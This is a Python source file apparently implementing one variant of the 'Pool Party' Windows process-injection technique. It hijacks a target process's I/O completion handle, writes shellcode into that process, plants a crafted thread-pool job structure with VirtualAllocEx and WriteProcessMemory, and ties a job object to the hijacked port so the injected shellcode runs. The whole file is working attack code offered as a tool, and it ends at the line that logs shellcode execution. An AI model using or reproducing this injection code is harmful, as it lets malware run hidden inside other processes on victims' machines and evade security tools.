from pool_party import *
from write_shellcode import *


class RemoteTPJobInsertion(PoolParty):
    def __init__(self, process):
        super().__init__(process)
        self.process_handle = HANDLE(0)
        self.handle_io_completion = HANDLE(0)
        self.shellcode_address = 0

    def hijack(self):
        self.handle_io_completion = self.hijack_process_handle(IO_COMPLETION_OBJECT_NAME,
                                                               ULONG(IO_COMPLETION_ALL_ACCESS))
        return True

    def write_shellcode_to_pool(self):
        self.shellcode_address = write_shellcode(self.process_handle)
        return True

    def setup_execute(self):
        job_handle = CreateJobObjectW(None, LPWSTR(POOL_PARTY_JOB_NAME))
        if job_handle is None:
            logging.error("[-] CreateJobObjectW Failed with Error Code %d" % GetLastError())
            return False

        size_full_tp_job = 296
        full_tp_job_ptr = (c_ubyte * size_full_tp_job)()
        ptr = cast(byref(full_tp_job_ptr), LPVOID)
        # This API different with API in C/C++, arg1 with change new memory to store data
        nt_status = TpAllocJobNotification(byref(ptr), job_handle, self.shellcode_address, None, None)
        if nt_status != 0:
            logging.error("[-] TpAllocJobNotification Failed With NT Status {:x}".format(nt_status))
            return False

        # So, i need copy new data to old buffer
        memmove(full_tp_job_ptr, ptr, size_full_tp_job)

        remote_tp_job_address = VirtualAllocEx(self.process_handle, None, SIZE_OF_FULL_TP_JOB_STRUCT, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if remote_tp_job_address is None:
            logging.error("[-] VirtualAllocEx for Full TP Job failed with Error Code %d" % GetLastError())
            return False

        if not WriteProcessMemory(self.process_handle, remote_tp_job_address, byref(full_tp_job_ptr), SIZE_OF_FULL_TP_JOB_STRUCT, None):
            logging.error("[-] WriteProcessMemory for Full TP Job failed with Error Code %d " % GetLastError())
            return False

        job_associate_completion_port = JOBOBJECT_ASSOCIATE_COMPLETION_PORT()
        if not SetInformationJobObject(job_handle, JobObjectAssociateCompletionPortInformation,
                                        byref(job_associate_completion_port),
                                        sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)):
            logging.error("[-] SetInformationJobObject Error with Error Code %d" % GetLastError())
            return False
        job_associate_completion_port.completion_key = remote_tp_job_address
        job_associate_completion_port.completion_port = self.handle_io_completion

        if not SetInformationJobObject(job_handle, JobObjectAssociateCompletionPortInformation,
                                       byref(job_associate_completion_port),
                                       sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)):
            logging.error("[-] SetInformationJobObject Error with Error Code %d" % GetLastError())
            return False

        if not AssignProcessToJobObject(job_handle, GetCurrentProcess()):
            logging.error("[-] AssignProcessToJobObject Error with Error Code %d" % GetLastError())
            return False

        logging.info("[+] Executing shellcode....")
